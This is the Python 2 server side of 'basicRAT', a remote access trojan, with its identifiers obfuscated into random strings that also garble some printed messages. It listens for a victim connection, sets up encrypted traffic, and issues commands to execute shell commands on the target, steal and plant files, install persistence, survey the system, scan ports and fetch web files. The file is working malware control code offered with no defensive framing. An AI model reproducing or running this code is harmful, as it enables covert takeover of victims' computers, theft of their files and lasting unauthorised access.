#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import PVayTxzTsXuVHdaTbmvmjjKYIcPvDCfp,nWfpHMtglmECQdQYhOJEvgLDLAxncADh,GmCEpXaBzxpjGMiONYNnyrBNiwXoeFeX
    from core.filesock import VZMYYKflhhpoDVoMZpjdZXgOvFauOPCJ, HzAjoiVYonBFgBOJBQkRmNoIKrnQyXOB
except ImportError as cWlqrfvNzzxrbrTekPlaLEzlYjkybXLa:
    print cWlqrfvNzzxrbrTekPlaLEzlYjkybXLa
    sys.exit(0)
tLJkHzUxRhLwnvpdfecUiJpLWdfFwULV = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
HqEjwUIfOjfJksWRwdkRjuaJNhQMBtKn = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
uHhfzKpjITfhPrbCwhcVPawqEyHfEIGr = [
            'download', 'help', 'persistence', 'quit', 'rekey',
            'run', 'scan', 'survey', 'unzip', 'upload', 'wget'
]
def CpHVnhHewJUoDtVMlRoBPLvtOPzdUxKx():
    oEKSFyvSibshvOyjKIvxxWCcAMcnCpsp = argparse.ArgumentParser(description='basicRAT server')
    oEKSFyvSibshvOyjKIvxxWCcAMcnCpsp.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return oEKSFyvSibshvOyjKIvxxWCcAMcnCpsp
def XOVOBRjAHsjqnEEVJTTuVWJqbbKEfUFl():
    oEKSFyvSibshvOyjKIvxxWCcAMcnCpsp  = CpHVnhHewJUoDtVMlRoBPLvtOPzdUxKx()
    jLVJNMUdvpSOyhCXjJohspplWIlyZFlt    = vars(oEKSFyvSibshvOyjKIvxxWCcAMcnCpsp.parse_args())
    HkBwytDGNDmwlGdyIoOzJgAnNkAWRbCs    = jLVJNMUdvpSOyhCXjJohspplWIlyZFlt['port']
    hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.bind(('0.0.0.0', HkBwytDGNDmwlGdyIoOzJgAnNkAWRbCs))
    except socket.error:
        print 'Error: Unable to start server, HkBwytDGNDmwlGdyIoOzJgAnNkAWRbCs {} in use?'.format(HkBwytDGNDmwlGdyIoOzJgAnNkAWRbCs)
        sys.exit(1)
    for qZBRdbpDaoEUfKpxsUbztUjNcUgcFkoD in HqEjwUIfOjfJksWRwdkRjuaJNhQMBtKn.split('\n'):
        time.sleep(0.05)
        print qZBRdbpDaoEUfKpxsUbztUjNcUgcFkoD
    print 'basicRAT server listening on HkBwytDGNDmwlGdyIoOzJgAnNkAWRbCs {}...'.format(HkBwytDGNDmwlGdyIoOzJgAnNkAWRbCs)
    hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.listen(10)
    qjulDNURbkRPgooFQZuezUHabRmySfYa, BVcoTRCxuBmWIWQRZcahtlifMKzbbUqb = hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.accept()
    GutViovUHfLLmnHwlWnvBSYXhxmgfrwP = GmCEpXaBzxpjGMiONYNnyrBNiwXoeFeX(qjulDNURbkRPgooFQZuezUHabRmySfYa, server=True)
    while True:
        PzibyrtPPLLJynoQoVRkpUFKtsbZDlwX = raw_input('\n[{}] basicRAT> '.format(BVcoTRCxuBmWIWQRZcahtlifMKzbbUqb[0])).rstrip()
        if not PzibyrtPPLLJynoQoVRkpUFKtsbZDlwX:
            continue
        ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi, _, action = PzibyrtPPLLJynoQoVRkpUFKtsbZDlwX.partition(' ')
        if ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi not in uHhfzKpjITfhPrbCwhcVPawqEyHfEIGr:
            print 'Invalid command, type "help" to see FqjTVDtVVBnsDoOPQuzPyWSOWIMziGTk list of commands.'
            continue
        if ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'help':
            print tLJkHzUxRhLwnvpdfecUiJpLWdfFwULV
            continue
        qjulDNURbkRPgooFQZuezUHabRmySfYa.send(nWfpHMtglmECQdQYhOJEvgLDLAxncADh(PzibyrtPPLLJynoQoVRkpUFKtsbZDlwX, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP))
        if ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'quit':
            hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.close()
            sys.exit(0)
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'run':
            YChvVwUSuDuGVrdFMBiPTOHCbHEOAcDW = qjulDNURbkRPgooFQZuezUHabRmySfYa.recv(4096)
            print PVayTxzTsXuVHdaTbmvmjjKYIcPvDCfp(YChvVwUSuDuGVrdFMBiPTOHCbHEOAcDW, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP).rstrip()
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'download':
            for wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc in action.split():
                wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc = wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc.strip()
                VZMYYKflhhpoDVoMZpjdZXgOvFauOPCJ(qjulDNURbkRPgooFQZuezUHabRmySfYa, wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP)
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'upload':
            for wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc in action.split():
                wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc = wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc.strip()
                HzAjoiVYonBFgBOJBQkRmNoIKrnQyXOB(qjulDNURbkRPgooFQZuezUHabRmySfYa, wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP)
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'rekey':
            GutViovUHfLLmnHwlWnvBSYXhxmgfrwP = GmCEpXaBzxpjGMiONYNnyrBNiwXoeFeX(qjulDNURbkRPgooFQZuezUHabRmySfYa, server=True)
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi)
            YChvVwUSuDuGVrdFMBiPTOHCbHEOAcDW = qjulDNURbkRPgooFQZuezUHabRmySfYa.recv(1024)
            print PVayTxzTsXuVHdaTbmvmjjKYIcPvDCfp(YChvVwUSuDuGVrdFMBiPTOHCbHEOAcDW, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP)
if __name__ == '__main__':
    XOVOBRjAHsjqnEEVJTTuVWJqbbKEfUFl()
